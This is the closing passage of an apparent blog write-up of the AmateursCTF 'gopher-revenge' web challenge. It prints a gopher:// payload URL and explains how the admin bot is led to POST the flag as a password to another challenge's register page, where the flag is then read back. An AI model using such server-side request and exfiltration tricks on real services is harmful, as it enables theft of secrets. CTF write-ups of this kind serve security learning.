<span class="k">print</span><span class="p">(</span><span class="s">'[payload] Gopher URL:'</span><span class="p">,</span> <span class="sa">f</span><span class="s">'gopher://amt.rs:31290/1/</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/image/amateursctf-web-writeup/gopher-revenge-payload.png" alt="Payload" /></p>

<p>This results in the bot POST to <code class="highlighter-rouge">https://cps.amt.rs/register.php</code> with the flag as the password. The URL is for another SQLi challenge (which was worth 0 point because of the solution was leaked), which I did not manage to solve (though I tried to solve it and only the next morning I realised I did not need to solve it and I already had the solution for gopher-revenge). The <code class="highlighter-rouge">/register.php</code> takes exactly username and password as the POST parameters, and returns a cookie named “token” in the response. The bot then shows the value of the cookie. When authenticated with the cookie, the site shows the password of the user.</p>

<p><img src="/assets/image/amateursctf-web-writeup/cps-authenticated.png" alt="CPS page showing password of the authenticated user" /></p>

<p>Copying the password into the flag submission did not work. I did ask the CTF organisers to confirm the code running on the server for the SQLi challenge is the same as the downloadables, and did not do anything special to the flag. The CTF organisers confirmed the code is the same, and said a few teams have stuck here. They then added “the flag in “flag.txt” is the exact same flag you need to submit” to the challenge description as a hint. Seeing the space showing in the password, I then realised it could have been a “+” in the original flag. I then tried to submit the flag with “+” instead of space, and it worked. I realised as I recently had the issue with “+” in the URL.</p>

  </div><a class="u-url" href="/posts/amateursctf-web-writeup/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">cjxol.com</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">cjxol.com</li><li><a class="u-email" href="mailto:i@cjxol.com">i@cjxol.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/allc"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">allc</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p></p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
